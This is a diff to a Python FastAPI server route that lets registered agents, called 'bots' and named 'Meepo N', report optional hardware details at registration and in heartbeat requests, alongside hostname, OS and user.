@@ -1,10 +1,11 @@
 # server/routes/agent.py
 import time
 import uuid
+from typing import Optional
 
 from fastapi import APIRouter
 
-from models import RegisterReq, ResultReq
+from models import RegisterReq, HeartbeatReq, ResultReq
 from state import (BOTS, TASKS, broadcast, bots_snapshot, tasks_snapshot,
                    next_meepo_num)
 from logic import recompute_parents
@@ -21,11 +22,15 @@ async def register(req: RegisterReq):
     meepo_num = next_meepo_num()
     agent_name = f"Meepo {meepo_num}"
 
+    info = {"os": req.os, "user": req.user}
+    if req.hardware is not None:
+        info["hardware"] = req.hardware
+
     bot = {
         "agent_name": agent_name,
         "meepo_num": meepo_num,
         "hostname": req.hostname,
-        "info": {"os": req.os, "user": req.user},
+        "info": info,
         "modules": req.modules or ["email"],
         "last_seen": time.time(),
         "current_task": None,
@@ -41,10 +46,16 @@ async def register(req: RegisterReq):
 
 
 @router.post("/heartbeat/{bot_id}")
-async def heartbeat(bot_id: str):
+async def heartbeat(bot_id: str, req: Optional[HeartbeatReq] = None):
     if bot_id not in BOTS:
         return {"ok": False, "error": "unknown bot"}
+
     BOTS[bot_id]["last_seen"] = time.time()
+
+    # ☄ Обновляем железо, если пришло
+    if req is not None and req.hardware is not None:
+        BOTS[bot_id].setdefault("info", {})
+        BOTS[bot_id]["info"]["hardware"] = req.hardware
 
     task = None
     if BOTS[bot_id]["current_task"] is None:
